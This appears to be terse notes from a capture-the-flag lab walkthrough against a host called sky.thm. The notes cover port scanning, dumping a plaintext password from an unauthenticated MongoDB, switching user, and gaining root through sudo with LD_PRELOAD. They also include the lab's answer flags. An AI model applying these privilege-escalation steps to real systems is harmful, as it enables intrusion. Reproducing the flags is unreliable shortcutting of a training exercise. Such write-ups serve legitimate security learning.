

```
└─$ nmap -Pn 10.10.255.119
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 13:04 PST
Nmap scan report for 10.10.255.119
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds

```

http://10.10.255.119/v2/profile.php -> admin@sky.thm

<!-- /v2/profileimages/ -->

user.txt -> 63191e4ece37523c9fe6bb62a5e64d45

```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount

```

ps aux | less
`mongodb      555  0.8  7.9 1497704 78908 ?       Ssl  21:03   0:20 /usr/bin/mongod --config /etc/mongod.conf
`

```
$ mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("6cf095e9-666a-49bd-8884-cd5b8d237508") }
MongoDB server version: 4.4.6
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
use admin
switched to db admin
show tables
system.version
use local
switched to db local
show tables
startup_log
use config
switched to db config
show tables
system.sessions
use backup
switched to db backup
show tables
collection
user
db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }

```
`webdeveloper:BahamasChapp123!@#`

www-data@sky:/$ su webdeveloper
su webdeveloper
Password: BahamasChapp123!@#

webdeveloper@sky:/$ sudo -l
sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility


webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/exploit.so /usr/bin/sky_backup_utility
<webdeveloper/exploit.so /usr/bin/sky_backup_utility
root@sky:/home/webdeveloper#

root.txt -> 3a62d897c40a815ecbe267df2f533ac6
